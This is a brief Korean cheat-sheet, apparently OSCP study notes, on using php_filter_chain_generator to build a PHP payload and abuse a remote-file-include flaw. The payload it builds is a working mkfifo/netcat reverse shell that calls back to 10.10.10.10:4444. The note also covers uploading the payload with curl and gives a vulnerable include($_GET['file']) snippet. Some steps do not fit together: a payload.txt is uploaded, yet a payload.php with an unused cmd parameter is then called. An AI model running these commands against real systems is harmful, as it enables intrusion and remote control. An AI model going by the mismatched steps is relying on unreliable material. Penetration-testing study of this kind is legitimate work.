# php pipe

## 개요

PHP의 `php_filter_chain_generator`로, 웹서버에 업로드한 PHP 파일에서 원격 스크립트를 실행하는 페이로드를 만든다.
`allow_url_include`가 켜져 있을 때 효과적이다.

## 사용법

```bash
# 1) 페이로드 생성
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"); ?>' | grep '^php' > payload.txt

# 2) 업로드 디렉터리로 전송
curl -s -F "file=@payload.txt" http://target/upload.php

# 3) 원격에서 명령 수행
http://target/uploads/payload.php?cmd=id
```

## 각 단계

- `--chain`에 실행할 PHP 코드를 문자열로 넣는다.
- 출력에서 `php`로 시작하는 줄만 남긴다.
- 결과 파일(`payload.txt`)을 타깃에 업로드한다.

## 대상 코드가 어떻게 동작하는지

```php
<?php
$file = $_GET['file'];
include($file);
?>
```

- `file` 파라미터로 원격 URL을 넘기면 RFI로 동작한다.
- `allow_url_include`가 활성화되어 있지 않으면 이 방식은 실패한다.

## 주의

- 이 방식은 php_filter_chain_generator가 공개 도구다. OSCP 시험에서 사용하는 경우는 드물다.
- 대상의 PHP 설정(allow_url_include)을 확인하는 것 자체가 정찰의 일부다.
- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
